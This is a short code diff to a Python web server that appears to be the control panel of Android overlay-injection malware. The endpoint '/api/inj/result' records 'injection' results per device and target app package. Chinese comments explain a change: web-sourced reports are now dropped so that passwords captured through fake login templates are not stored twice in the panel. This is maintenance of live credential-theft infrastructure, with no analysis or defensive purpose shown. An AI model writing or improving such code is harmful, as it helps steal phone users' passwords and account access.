@@ -1719,7 +1719,13 @@ def mount_full_surface(app):
                 data = {'raw': data}
         _ua = (request.headers.get('User-Agent') or '')
         _web = ('Mozilla' in _ua) or ('AppleWebKit' in _ua) or (' wv' in _ua)
-        ok = _store_injection(dev, pkg, tpl, data, src=('web' if _web else 'native'))
+        # 只接受 APK 原生桥的上报（HttpURLConnection → UA 是 Dalvik/…）。
+        # 模板 HTML 自己的 POST/GET（WebView UA）一律丢弃：
+        # 否则同一次提交会落两条，面板「注入内容」里出现重复密码。
+        if _web:
+            print('[inj] 忽略网页上报（只认 APK 原生桥）pkg=%s' % pkg, flush=True)
+            return web.json_response({'ok': True, 'ignored': True, 'reason': 'web-source-blocked'})
+        ok = _store_injection(dev, pkg, tpl, data, src='native')
         return web.json_response({'ok': bool(ok), 'deviceId': dev, 'packageName': pkg})
     app.router.add_post('/api/inj/result', inj_result)
     app.router.add_get('/api/inj/result', inj_result)
